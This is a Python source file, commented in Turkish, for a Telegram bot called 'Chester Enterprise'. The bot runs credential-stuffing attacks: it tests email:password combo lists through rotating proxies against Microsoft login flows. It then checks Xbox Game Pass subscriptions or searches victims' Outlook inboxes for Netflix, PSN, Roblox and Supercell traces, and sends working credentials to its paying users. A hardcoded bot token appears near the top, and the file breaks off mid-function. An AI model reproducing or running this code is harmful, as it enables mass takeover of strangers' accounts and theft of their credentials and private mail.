#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║        CHESTER ENTERPRISE BOT ALTYAPISI (v4.5 - GOLD EDITION)        ║
║   Dinamik Proxy Havuzu, Gelişmiş Admin Yönetimi & Çoklu Modüller    ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import uuid
import json
import base64
import random
import string
import sqlite3
import imaplib
import threading
import itertools
import concurrent.futures
from datetime import datetime, timedelta
from urllib.parse import quote, quote_plus, unquote, urlparse, parse_qs

import requests
import urllib3
import warnings
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Güvenlik ve SSL uyarılarını tamamen kapat
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# --- KRİTİK ALTYAPI KONFİGÜRASYONLARI ---
BOT_TOKEN = "7697030798:AAHiTipLyZu7HCjJnCFu5CEgAHYaqP64ha4"
FOUNDER_ID = 8664147577  # Muhammet - Kurucu ID
DB_NAME = "chester_enterprise.db"

bot = telebot.TeleBot(BOT_TOKEN)

# Veritabanı kilitleme hatalarını (database is locked) önlemek için Thread-Local yapısı ve Lock mekanizması
db_lock = threading.Lock()

# --- GLOBAL KULLANICI AGENTLERİ (USER AGENTS) ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Outlook-Android/2.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36"
]
def get_random_ua(): 
    return random.choice(USER_AGENTS)

# --- VERİTABANI VE TABLO BAŞLATICISI ---
def init_enterprise_db():
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        
        # Kullanıcılar Tablosu
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            role TEXT DEFAULT 'user',
            expire_date TEXT
        )""")
        
        # Lisans Keyleri Tablosu
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS keys (
            key_code TEXT PRIMARY KEY,
            duration_days INTEGER,
            status TEXT DEFAULT 'unused',
            created_by INTEGER
        )""")
        
        # Proxyler Tablosu (Silinme ve sıfırlanma sorunları düzeltildi)
        cursor.execute("""
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy_str TEXT UNIQUE,
            proxy_type TEXT DEFAULT 'http'
        )""")
        
        # Kurucuyu sisteme otomatik ekle
        cursor.execute("INSERT OR IGNORE INTO users (user_id, username, role, expire_date) VALUES (?, ?, ?, ?)",
                       (FOUNDER_ID, "Founder_Muhammet", "founder", "2099-12-31 23:59:59"))
        
        conn.commit()
        conn.close()

init_enterprise_db()

# --- GÜVENLİ VE KALICI PROXY HAVUZU (Thread-Safe Proxy Pool) ---
class ThreadSafeProxyPool:
    def __init__(self):
        self.lock = threading.Lock()
        self.proxies = []         
        self.formatted_list = []  
        self.cycle_iterator = None
        self.reload_pool()

    def reload_pool(self):
        with self.lock:
            with db_lock:
                conn = sqlite3.connect(DB_NAME, timeout=30)
                cursor = conn.cursor()
                cursor.execute("SELECT proxy_str, proxy_type FROM proxies")
                rows = cursor.fetchall()
                conn.close()
            
            self.proxies = rows
            self.formatted_list = []
            
            for proxy_str, proxy_type in rows:
                p_type = proxy_type.lower()
                clean_proxy = proxy_str.strip().replace('\r', '').replace('\n', '')
                if not clean_proxy:
                    continue
                if "://" in clean_proxy:
                    parsed = urlparse(clean_proxy)
                    clean_proxy = parsed.netloc
                
                formatted = {
                    "http": f"{p_type}://{clean_proxy}",
                    "https": f"{p_type}://{clean_proxy}"
                }
                self.formatted_list.append(formatted)
                
            if self.formatted_list:
                self.cycle_iterator = itertools.cycle(self.formatted_list)
            else:
                self.cycle_iterator = None

    def get_proxy(self):
        with self.lock:
            if not self.cycle_iterator:
                return None
            return next(self.cycle_iterator)

    def get_count(self):
        with self.lock:
            return len(self.formatted_list)

proxy_pool = ThreadSafeProxyPool()

# --- ÇALIŞMA ZAMANI DURUM TAKİBİ VE RUNTIME CONTEXTS ---
active_sessions = {}
user_states = {}

class ScanRuntimeContext:
    def __init__(self, chat_id, total_combos, target_module):
        self.chat_id = chat_id
        self.total = total_combos
        self.module_name = target_module
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.retry = 0
        self.xgpu = 0
        self.xgp = 0
        self.other = 0
        self.start_time = time.time()
        self.is_running = True
        self.lock = threading.Lock()
        self.hits_output = []

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return int((self.checked / elapsed) * 60)
        return 0

# --- ROLLER VE YETKİLENDİRME SİSTEMİ ---
def check_access(user_id):
    if user_id == FOUNDER_ID: 
        return True, "founder"
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        cursor.execute("SELECT role, expire_date FROM users WHERE user_id = ?", (user_id,))
        row = cursor.fetchone()
        conn.close()
    
    if not row: 
        return False, "guest"
    role, exp_str = row
    if role in ['founder', 'admin']: 
        return True, role
    try:
        exp_date = datetime.strptime(exp_str, "%Y-%m-%d %H:%M:%S")
        if datetime.now() < exp_date: 
            return True, role
    except: 
        pass
    return False, "expired"

def is_privileged(user_id):
    if user_id == FOUNDER_ID: 
        return True
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        cursor.execute("SELECT role FROM users WHERE user_id = ? AND role IN ('founder', 'admin')", (user_id,))
        row = cursor.fetchone()
        conn.close()
    return True if row else False

# ======================================================================
# CORE MICROSOFT / HOTMAIL & OAUTH LOGIC (SHARED AUTHENTICATION)
# ======================================================================

def core_microsoft_login(email, password, px_dict):
    """Microsoft OAuth Giriş Akışı - Tüm Modüller ve Xbox için Ortak Taban"""
    try:
        s = requests.Session()
        s.verify = False
        if px_dict: 
            s.proxies.update(px_dict)
            
        url1 = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1"
            f"&login_hint={quote(email)}"
            "&mkt=en&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        r1 = s.get(url1, headers={"User-Agent": get_random_ua()}, timeout=12)
        
        post_url, ppft = None, None
        for pat in [r'urlPost":"([^"]+)"', r"urlPost:'([^']+)'"]:
            m = re.search(pat, r1.text)
            if m: 
                post_url = m.group(1).replace("\\/", "/")
                break
        for pat in [r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r'name="PPFT"[^>]*value="([^"]+)"']:
            m = re.search(pat, r1.text)
            if m: 
                ppft = m.group(1)
                break
            
        if not post_url or not ppft: 
            return {"status": "RETRY"}
            
        body = (
            f"i13=1&login={quote(email)}&loginfmt={quote(email)}"
            f"&type=11&LoginOptions=1&passwd={quote(password)}"
            f"&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1"
            "&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&i19=9960"
        )
        r2 = s.post(post_url, data=body, headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":get_random_ua()}, allow_redirects=False, timeout=12)
        t = r2.text.lower()
        
        if "incorrect" in t or r2.text.count('"error"') > 2: 
            return {"status": "BAD"}
        if any(x in t for x in ["identity/confirm","proofup","sms","authenticator","consent"]): 
            return {"status": "2FA"}
        if "abuse" in t: 
            return {"status": "BAD"}
            
        loc = r2.headers.get("Location", "")
        if not loc or "code=" not in loc: 
            return {"status": "BAD"}
        code = re.search(r"code=([^&]+)", loc).group(1)
        cid = s.cookies.get("MSPCID", str(uuid.uuid4())).upper()
        
        r3 = s.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=(
                "client_info=1"
                "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
                "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                f"&grant_type=authorization_code&code={code}"
                "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            ),
            headers={"Content-Type":"application/x-www-form-urlencoded"},
            timeout=12
        )
        if "access_token" not in r3.text: 
            return {"status": "BAD"}
        return {"status": "HIT", "token": r3.json()["access_token"], "cid": cid, "session": s}
    except:
        return {"status": "RETRY"}

def core_ms_search(session, token, cid, query):
    """Outlook Gelen Kutusu Arama API Entegrasyonu (Nova AIO Tabanlı)"""
    try:
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                "From": 0,
                "Query": {"QueryString": query},
                "Size": 15,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        hdrs = {
            "User-Agent": "Outlook-Android/2.0",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }
        r = session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=hdrs, timeout=12)
        if r.status_code != 200: 
            return []
        rs = r.json().get("EntitySets", [{}])[0].get("ResultSets", [{}])[0]
        return rs.get("Results", [])
    except:
        return []

# ======================================================================
# ① XBOX & GAMEPASS CHECKER MOTORU (XboxChecker.py OAUTH INTEGRATION)
# ======================================================================

SFTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def xbox_get_sftag(session):
    try:
        r = session.get(SFTAG_URL, timeout=10)
        t = r.text
        m_sftag = re.search(r'value=\\\"(.+?)\\\"', t, re.S) or re.search(r'value="(.+?)"', t, re.S)
        m_post = re.search(r'"urlPost":"(.+?)"', t, re.S) or re.search(r"urlPost:'(.+?)'", t, re.S)
        if m_sftag and m_post:
            return m_post.group(1).replace("\\/", "/"), m_sftag.group(1)
        return None, None
    except:
        return None, None

def check_xbox_gamepass(email, password, px_dict):
    """XboxChecker.py Orijinal API Akışı - Tam Entegrasyon"""
    try:
        s = requests.Session()
        s.verify = False
        if px_dict: 
            s.proxies.update(px_dict)
            
        url_post, sftag = xbox_get_sftag(s)
        if not url_post or not sftag: 
            return "RETRY", "SFTAG_ERROR"
            
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
        r_login = s.post(url_post, data=data, headers={"User-Agent": get_random_ua()}, allow_redirects=False, timeout=10)
        
        loc = r_login.headers.get('Location', '')
        if "access_token" not in loc:
            t = r_login.text.lower()
            if "incorrect" in t: 
                return "BAD", "Wrong Credentials"
            if "proofup" in t or "sms" in t or "authenticator" in t: 
                return "2FA", "Two-Factor Auth"
            return "BAD", "Auth Failed"
            
        parsed = urlparse(loc.replace("#", "?"))
        qs = parse_qs(parsed.query)
        access_token = qs.get('access_token', [None])[0]
        if not access_token: 
            return "BAD", "Token Extraction Failed"
            
        # Xbox Live Authentication (UserToken)
        u_url = "https://user.auth.xboxlive.com/user/authenticate"
        u_pay = {
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT",
            "Properties": {
                "AuthMethod": "RPS",
                "SiteName": "user.auth.xboxlive.com",
                "RpsTicket": f"t={access_token}"
            }
        }
        r_u = s.post(u_url, json=u_pay, headers={"Content-Type": "application/json", "Accept": "application/json"}, timeout=10)
        if r_u.status_code != 200: 
            return "BAD", "Xbox Auth Failed"
            
        u_data = r_u.json()
        u_token = u_data["Token"]
        uhs = u_data["DisplayClaims"]["xui"][0]["uhs"]
        
        # XSTS Token Generation
        x_url = "https://xsts.auth.xboxlive.com/xsts/authorize"
        x_pay = {
            "RelyingParty": "http://mp.microsoft.com",
            "TokenType": "JWT",
            "Properties": {
                "SelectOwner": f"Xuid:{uhs}",
                "UserTokens": [u_token]
            }
        }
        r_x = s.post(x_url, json=x_pay, headers={"Content-Type": "application/json", "Accept": "application/json"}, timeout=10)
        if r_x.status_code == 401:
            if "2148916238" in r_x.text: 
                return "BAD", "Child account / No Xbox Profile"
            return "BAD", "XSTS Unauthorized"
        if r_x.status_code != 200: 
            return "BAD", "XSTS Generation Failed"
            
        x_data = r_x.json()
        x_token = x_data["Token"]
        
        # Entitlements / Subscription Check (Gamepass Verification)
        ent_url = f"https://purchase.mp.microsoft.com/v8.0/users/me/entitlements?beneficiary=Xuid:{uhs}"
        ent_hdrs = {
            "Authorization": f"XBL3.0 x={uhs};{x_token}",
            "User-Agent": get_random_ua(),
            "Host": "purchase.mp.microsoft.com"
        }
        r_ent = s.get(ent_url, headers=ent_hdrs, timeout=10)
        if r_ent.status_code != 200:
            return "HIT", "Xbox Active (No Subscription Info)"
            
        ent_data = r_ent.json()
        items = ent_data.get("items", [])
        if not items:
            return "HIT", "Xbox Active (No Active Subscriptions)"
            
        subs = []
        is_xgpu = False
        is_xgp = False
        
        for item in items:
            p_id = item.get("productId", "").upper()
            # Xbox Ultimate / Core / Console Global Product ID Tanımlamaları
            if p_id in ["CFQ7TTC0HSTD", "CFQ7TTC0K56B"]:
                subs.append("Xbox Game Pass Ultimate")
                is_xgpu = True
            elif p_id in ["CFQ7TTC0HSTC", "CFQ7TTC0K56A"]:
                subs.append("Xbox Game Pass Core")
                is_xgp = True
            elif p_id in ["CFQ7TTC0HSTR"]:
                subs.append("Xbox Game Pass for PC")
                is_xgp = True
                
        if is_xgpu:
            return "XGPU", " | ".join(subs)
        if is_xgp:
            return "XGP", " | ".join(subs)
        return "HIT", "Xbox Active | Sub: " + (", ".join(subs) if subs else "Standard Profile")
    except:
        return "RETRY", "Network Exception"

# ======================================================================
# ② NOVA AIO CHECKER MODÜLLERİ (NETFLIX, PSN, ROBLOX, SUPERCELL)
# ======================================================================

def check_netflix_module(email, password, px_dict):
    res = core_microsoft_login(email, password, px_dict)
    if res["status"] != "HIT": 
        return res["status"], ""
    results = core_ms_search(res["session"], res["token"], res["cid"], "info@account.netflix.com OR netflix billing")
    if not results: 
        return "BAD", "No Netflix Trace"
    full_text = " ".join([r.get("Preview", "") + r.get("Subject", "") for r in results]).lower()
    plan = "Premium 4K" if "premium" in full_text or "4k" in full_text else "Standard/Basic"
    return "HIT", f"Netflix Account Detected (Plan: {plan})"

def check_psn_module(email, password, px_dict):
    res = core_microsoft_login(email, password, px_dict)
    if res["status"] != "HIT": 
        return res["status"], ""
    results = core_ms_search(res["session"], res["token"], res["cid"], "sony OR playstation")
    if not results: 
        return "BAD", "No PSN Trace"
    full_text = " ".join([r.get("Preview", "") + r.get("Subject", "") for r in results]).lower()
    wallet = "Found Transaction History" if "order" in full_text or "thank you for your purchase" in full_text else "Active Account"
    return "HIT", f"PSN Network: {wallet}"

def check_roblox_module(email, password, px_dict):
    res = core_microsoft_login(email, password, px_dict)
    if res["status"] != "HIT": 
        return res["status"], ""
    results = core_ms_search(res["session"], res["token"], res["cid"], "roblox")
    if not results: 
        return "BAD", "No Roblox Trace"
    full_text = " ".join([r.get("Preview", "") + r.get("Subject", "") for r in results]).lower()
    robux = "Robux/Premium Purchase Found" if "robux" in full_text or "ticket" in full_text else "Standard Roblox User"
    return "HIT", f"Roblox: {robux}"

def check_supercell_module(email, password, px_dict):
    res = core_microsoft_login(email, password, px_dict)
    if res["status"] != "HIT": 
        return res["status"], ""
    results = core_ms_search(res["session"], res["token"], res["cid"], "supercell ID OR clash of clans OR royale")
    if not results: 
        return "BAD", "No Supercell Trace"
    return "HIT", "Supercell ID Bound Account"

# ======================================================================
# CORE PIPELINE EXECUTOR (ÇOKLU İŞ PARÇACIĞI MOTORU)
# ======================================================================

def core_pipeline_executor(chat_id, combos, target_module):
    """Eşzamanlı Tarama Yönetimi ve Dinamik Raporlama"""
    ctx = ScanRuntimeContext(chat_id, len(combos), target_module)
    active_sessions[chat_id] = ctx
    
    # Bilgilendirme Mesajı Gönder ve ID'sini Kaydet
    status_msg = bot.send_message(
        chat_id, 
        f"⚡ *Chester Engine Aktif Edildi*\n\n"
        f"Modül: `{target_module.upper()}`\n"
        f"Toplam Satır: `{ctx.total}`\n"
        f"Durum: `Hazırlanıyor...`", 
        parse_mode="Markdown"
    )
    
    def updater_loop():
        while ctx.is_running:
            time.sleep(4)
            with ctx.lock:
                cpm = ctx.get_cpm()
                progress = (ctx.checked / ctx.total * 100) if ctx.total > 0 else 0
                
                # Modüle özgü detay paneli hazırlığı
                extra_details = ""
                if ctx.module_name == "xbox":
                    extra_details = f"🟢 XGPU: `{ctx.xgpu}` | 🔵 XGP: `{ctx.xgp}`\n"
                
                text = (
                    f"⚙️ *Tarama Durumu - Chester Enterprise v4.5*\n\n"
                    f"Modül: `{ctx.module_name.upper()}`\n"
                    f"İlerleme: `[{ctx.checked}/{ctx.total}]` (%{progress:.1f})\n"
                    f"🚀 CPM: `{cpm}` | 🔄 Retry: `{ctx.retry}`\n\n"
                    f"🔥 HIT: `{ctx.hits}`\n"
                    f"{extra_details}"
                    f"💀 BAD: `{ctx.bad}` | 🔒 2FA: `{ctx.twofa}`"
                )
                
                # Eğer tarama bitmişse döngüyü kır
                if ctx.checked >= ctx.total:
                    break
            try:
                bot.edit_message_text(text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown")
            except:
                pass

    threading.Thread(target=updater_loop, daemon=True).start()

    # İş parçacığı havuzu (Thread Pool) kurulumu
    with concurrent.futures.ThreadPoolExecutor(max_workers=35) as executor:
        futures = {}
        for combo in combos:
            if not ctx.is_running: 
                break
            futures[executor.submit(worker_task, combo, ctx)] = combo
            
        for future in concurrent.futures.as_completed(futures):
            if not ctx.is_running: 
                break
            try:
                future.result()
            except:
                pass

    ctx.is_running = False
    
    # Tarama Sonu Nihai Raporu
    final_report = (
        f"🏁 *Tarama İşlemi Tamamlandı!*\n\n"
        f"Modül: `{ctx.module_name.upper()}`\n"
        f"Toplam Kontrol Edilen: `{ctx.checked}`\n"
        f"🎯 Toplam HIT: `{ctx.hits}`\n"
        f"💀 Toplam BAD: `{ctx.bad}`\n"
        f"🔑 Toplam 2FA: `{ctx.twofa}`"
    )
    bot.send_message(chat_id, final_report, parse_mode="Markdown")
    
    # Kullanıcıya HIT listesini dosya olarak teslim etme
    if ctx.hits_output:
        hit_file_path = f"hits_{chat_id}_{int(time.time())}.txt"
        with open(hit_file_path, "w", encoding="utf-8") as f:
            f.write("\n".join(ctx.hits_output))
        with open(hit_file_path, "rb") as f:
            bot.send_document(chat_id, f, caption="🎯 Elde Edilen Tüm Başarılı Girişler (HIT List)")
        try:
            os.remove(hit_file_path)
        except:
            pass
            
    if chat_id in active_sessions:
        del active_sessions[chat_id]

def worker_task(combo, ctx):
    """Bireysel Hesap Denetim Görevi"""
    if ":" not in combo:
        with ctx.lock: 
            ctx.checked += 1
        return
        
    email, password = combo.strip().split(":", 1)
    px = proxy_pool.get_proxy()
    
    status, info = "BAD", ""
    
    # Hedef Modüle Göre İşlem Dağıtımı
    if ctx.module_name == "xbox":
        status, info = check_xbox_gamepass(email, password, px)
    elif ctx.module_name == "netflix":
        status, info = check_netflix_module(email, password, px)
    elif ctx.module_name == "psn":
        status, info = check_psn_module(email, password, px)
    elif ctx.module_name == "roblox":
        status, info = check_roblox_module(email, password, px)
    elif ctx.module_name == "supercell":
        status, info = check_supercell_module(email, password, px)

    # İstatistik Güncelleme Mantığı
    with ctx.lock:
        if status == "RETRY":
            ctx.retry += 1
            # Yeniden havuza ekleme opsiyonu (opsiyonel limit eklenebilir)
            return worker_task(combo, ctx)
        elif status == "BAD":
            ctx.bad += 1
            ctx.checked += 1
        elif status == "2FA":
            ctx.twofa += 1
            ctx.checked += 1
        elif status in ["HIT", "XGP", "XGPU"]:
            ctx.hits += 1
            ctx.checked += 1
            if status == "XGPU": 
                ctx.xgpu += 1
            elif status == "XGP": 
                ctx.xgp += 1
                
            hit_line = f"{email}:{password} -> [{status}] {info}"
            ctx.hits_output.append(hit_line)
            
            # Anlık canlı bildirim
            bot.send_message(
                ctx.chat_id, 
                f"🎯 *CHESTER HIT!*\n\n"
                f"📧 Hesap: `{email}:{password}`\n"
                f"📌 Detay: `{info}`\n"
                f"🚀 Modül: `{ctx.module_name.upper()}`", 
                parse_mode="Markdown"
            )

# ======================================================================
# KEYBOARD GENERATORS & UI DESIGNS
# ======================================================================

def menu_main_keyboard(uid):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(InlineKeyboardButton("🎮 XBOX / GAMEPASS", callback_data="mod_xbox"))
    kb.add(InlineKeyboardButton("🎬 NETFLIX", callback_data="mod_netflix"))
    kb.add(InlineKeyboardButton("🕹️ PLAYSTATION", callback_data="mod_psn"))
    kb.add(InlineKeyboardButton("🧱 ROBLOX", callback_data="mod_roblox"))
    kb.add(InlineKeyboardButton("⚡ SUPERCELL", callback_data="mod_supercell"))
    if is_privileged(uid):
        kb.add(InlineKeyboardButton("👑 ADMİN DASHBOARD", callback_data="adm_dashboard"))
    return kb

def show_admin_dashboard_ui(chat_id, mid):
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        u = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM keys")
        k = cursor.fetchone()[0]
        conn.close()
    p = proxy_pool.get_count()
    
    txt = (
        f"👑 *CHESTER ENTERPRISE PANEL*\n\n"
        f"👥 Kayıtlı Üye: `{u}`\n"
        f"🔑 Toplam Lisans: `{k}`\n"
        f"🌐 Havuzdaki Proxy: `{p}`\n\n"
        f"Yönetmek istediğiniz sistemi seçin:"
    )
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(InlineKeyboardButton("🌐 Proxy Yönetimi", callback_data="adm_proxy_hub"))
    kb.add(InlineKeyboardButton("🔑 Lisans Üret", callback_data="adm_key_hub"))
    kb.add(InlineKeyboardButton("📢 Toplu Mesaj (Broadcast)", callback_data="adm_broadcast_prompt"))
    kb.add(InlineKeyboardButton("➕ Admin/Mod Ekle", callback_data="adm_add_staff_prompt"))
    kb.add(InlineKeyboardButton("🔙 Ana Menü", callback_data="nav_home"))
    bot.edit_message_text(txt, chat_id=chat_id, message_id=mid, parse_mode="Markdown", reply_markup=kb)

def show_proxy_manager_ui(chat_id, mid):
    p_count = proxy_pool.get_count()
    txt = (
        f"🌐 *PROXY KONTROL MERKEZİ*\n\n"
        f"Şu an havuzda *{p_count}* aktif proxy yüklü.\n\n"
        f"Yüklemek istediğiniz proxy tipini seçin:"
    )
    kb = InlineKeyboardMarkup(row_width=3)
    kb.add(
        InlineKeyboardButton("HTTP", callback_data="adm_prompt_px_http"),
        InlineKeyboardButton("SOCKS4", callback_data="adm_prompt_px_socks4"),
        InlineKeyboardButton("SOCKS5", callback_data="adm_prompt_px_socks5")
    )
    kb.add(InlineKeyboardButton("🗑️ Havuzu Tamizle", callback_data="adm_clear_px"))
    kb.add(InlineKeyboardButton("🔙 Panel", callback_data="adm_dashboard"))
    bot.edit_message_text(txt, chat_id=chat_id, message_id=mid, parse_mode="Markdown", reply_markup=kb)

# ======================================================================
# BOT TELEGRAM TELEBOT HANDLERS (TELEGRAM TETİKLEYİCİLERİ)
# ======================================================================

@bot.message_handler(commands=['start'])
def command_start(message):
    uid = message.from_user.id
    uname = message.from_user.username or "User"
    
    # Kullanıcı kaydı kontrolü
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (uid,))
        if not cursor.fetchone():
            cursor.execute("INSERT INTO users (user_id, username, role, expire_date) VALUES (?, ?, 'user', ?)",
                           (uid, uname, (datetime.now() + timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
        conn.close()

    has_access, role = check_access(uid)
    if not has_access:
        bot.send_message(message.chat.id, "❌ *Sistem Erişimi Engellendi!*\n\nLisans süreniz dolmuş veya yetkiniz yok. Yeni key girmek için /redeem <KEY_KODU> komutunu kullanın.", parse_mode="Markdown")
        return

    welcome_text = (
        f"╔═════════════════════════════════════╗\n"
        f"     *CHESTER ENTERPRISE v4.5 BOT*\n"
        f"╚═════════════════════════════════════╝\n\n"
        f"👋 Merhaba, `{uname}`!\n"
        f"🔰 Yetki Durumunuz: `{role.upper()}`\n"
        f"🌐 Havuzdaki Canlı Proxy: `{proxy_pool.get_count()}`\n\n"
        f"Lütfen tarama yapmak istediğiniz ana modülü aşağıdan seçin:"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=menu_main_keyboard(uid))

@bot.message_handler(commands=['redeem'])
def command_redeem(message):
    uid = message.from_user.id
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Kullanım: `/redeem LİSANS_KODU`", parse_mode="Markdown")
        return
    code = parts[1].strip()
    
    with db_lock:
        conn = sqlite3.connect(DB_NAME, timeout=30)
        cursor = conn.cursor()
        cursor.execute("SELECT duration_days FROM keys WHERE key_code = ? AND status = 'unused'", (code,))
        row = cursor.fetchone()
        
        if not row:
            bot.reply_to(message, "❌ Geçersiz veya daha önce kullanılmış lisans kodu!")
            conn.close()
            return
            
        days = row[0]
        cursor.execute("UPDATE keys SET status = 'used' WHERE key_code = ?", (code,))
        
        # Kullanıcının süresini güncelle
        cursor.execute("SELECT expire_date, role FROM users WHERE user_id = ?", (uid,))
        u_row = cursor.fetchone()
        
        new_exp = datetime.now() + timedelta(days=days)
        if u_row:
            try:
                current_exp = datetime.strptime(u_row[0], "%Y-%m-%d %H:%M:%S")
                if current_exp > datetime.now():
                    new_exp = current_exp + timedelta(days=days)
            except:
                pass
            cursor.execute("UPDATE users SET expire_date = ? WHERE user_id = ?", (new_exp.strftime("%Y-%m-%d %H:%M:%S"), uid))
        else:
            cursor.execute("INSERT INTO users (user_id, username, role, expire_date) VALUES (?, ?, 'user', ?)",
                           (uid, message.from_user.username, new_exp.strftime("%Y-%m-%d %H:%M:%S")))
                           
        conn.commit()
        conn.close()
        
    bot.reply_to(message, f"✅ *Başarılı!* Hesabınıza `+{days}` gün premium süre eklendi. Son Tarih: `{new_exp.strftime('%Y-%m-%d')}`", parse_mode="Markdown")

# ======================================================================
# CALLBACK DISPATCHER (BUTON ETKİLEŞİM YÖNETİCİSİ)
# ======================================================================

@bot.callback_query_handler(func=lambda call: True)
def callback_dispatcher(call):
    chat_id = call.message.chat.id
    mid = call.message.message_id
    uid = call.from_user.id
    data = call.data

    has_access, role = check_access(uid)
    if not has_access:
        bot.answer_callback_query(call.id, "❌ Erişim süreniz dolmuş!", show_alert=True)
        return

    # Modül Seçim Yönetimleri
    if data.startswith("mod_"):
        target_mod = data.split("_")[1]
        user_states[uid] = target_mod
        bot.answer_callback_query(call.id, f"{target_mod.upper()} Modülü Seçildi.")
        
        msg = bot.send_message(
            chat_id, 
            f"📥 *{target_mod.upper()} Hesap Doğrulama*\n\n"
            f"Lütfen taranacak hesap listesini temiz metin (user:pass) veya `.txt` dosyası olarak gönderin.", 
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(msg, step_receive_combo_file)
        return

    # Navigasyon Komutları
    if data == "nav_home":
        bot.edit_message_text(
            "🎮 Ana Kontrol Merkezine Hoş Geldiniz. Bir modül seçin:", 
            chat_id=chat_id, message_id=mid, 
            reply_markup=menu_main_keyboard(uid)
        )
        return

    # Gelişmiş Yetkili Paneli Callback İşlemleri
    if not is_privileged(uid):
        bot.answer_callback_query(call.id, "❌ Bu işlem için yetkiniz yok.", show_alert=True)
        return

    if data == "adm_dashboard":
        show_admin_dashboard_ui(chat_id, mid)
    elif data == "adm_proxy_hub":
        show_proxy_manager_ui(chat_id, mid)
        
    elif data.startswith("adm_prompt_px_"):
        p_type = data.split("_")[3]
        user_states[uid] = f"addproxy_{p_type}"
        msg = bot.send_message(chat_id, f"📥 Lütfen sisteme yüklenecek *{p_type.upper()}* proxy listesini iletin:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, step_bulk_proxy_save)
        
    elif data == "adm_clear_px":
        with db_lock:
            conn = sqlite3.connect(DB_NAME, timeout=30)
            cursor = conn.cursor()
            cursor.execute("DELETE FROM proxies")
            conn.commit()
            conn.close()
        proxy_pool.reload_pool()
        bot.answer_callback_query(call.id, "🗑️ Tüm proxy havuzu sıfırlandı.", show_alert=True)
        show_proxy_manager_ui(chat_id, mid)
        
    elif data == "adm_key_hub":
        kb = InlineKeyboardMarkup(row_width=3)
        kb.add(
            InlineKeyboardButton("1 Günlük", callback_data="genkey_1"),
            InlineKeyboardButton("7 Günlük", callback_data="genkey_7"),
